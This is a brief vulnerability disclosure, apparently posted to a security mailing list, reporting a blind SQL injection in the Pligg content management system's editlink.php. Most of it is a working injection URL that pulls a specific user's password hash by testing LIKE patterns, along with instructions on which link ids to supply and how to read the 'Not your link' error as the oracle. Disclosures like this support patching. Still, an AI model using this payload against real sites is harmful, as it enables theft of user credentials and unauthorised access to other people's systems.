Hello,

the Pligg (http://www.pligg.com/) content management system is prone to
an SQL-injection vulnerability because it fails to sufficiently sanitize
user-supplied data before using it in an SQL query:


editlink.php?id=1+AND+((SELECT+user_pass+FROM+pligg_users+WHERE+user_login=0x676f64)+LIKE+0x25)+UNION+SELECT+10,2

To exploit this you need the id of a news you submitted(10 in the
example) and an id of a news submitted by others(1 in the example).

When the LIKE statement matches you get a "Not your link" error.
